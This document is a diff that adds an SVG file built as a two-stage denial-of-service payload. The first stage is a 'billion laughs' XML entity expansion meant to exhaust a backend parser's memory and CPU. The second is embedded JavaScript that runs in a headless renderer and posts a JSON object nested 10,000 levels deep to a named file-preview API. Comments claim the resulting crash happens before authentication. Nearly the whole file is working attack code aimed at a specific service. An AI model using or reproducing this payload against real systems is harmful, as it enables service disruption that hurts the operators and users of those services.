@@ -1,0 +1,44 @@
+<?xml version="1.0"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
+ <!ENTITY lol "lol">
+ <!ELEMENT lolz (#PCDATA)>
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+]>
+<svg width="1000" height="1000" xmlns="http://www.w3.org/2000/svg">
+    <!-- Stage 1: XML Entity Expansion (Decompression Bomb) -->
+    <!-- This will exhaust worker memory/CPU during backend parsing -->
+    <text x="0" y="0">&lol8;</text>
+    
+    <!-- Stage 2: Deep JSON Injection via Arbitrary JS Execution -->
+    <!-- This triggers when Headless Chrome renders the SVG -->
+    <script type="text/javascript">
+    <![CDATA[
+        // Construct a 10,000-level deeply nested JSON object
+        const depth = 10000;
+        let payload = '{"url": "http://example.com", "user_data": ';
+        payload += '{"n": '.repeat(depth);
+        payload += '1';
+        payload += '}'.repeat(depth);
+        payload += '}';
+
+        // Send the payload to the core API
+        // This bypasses auth because the JSON parsing crash occurs at the middleware 
+        // layer before authentication validation can reject the request.
+        fetch('https://api.filepreviews.io/v2/previews/', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: payload,
+            mode: 'no-cors'
+        });
+    ]]>
+    </script>
+</svg>
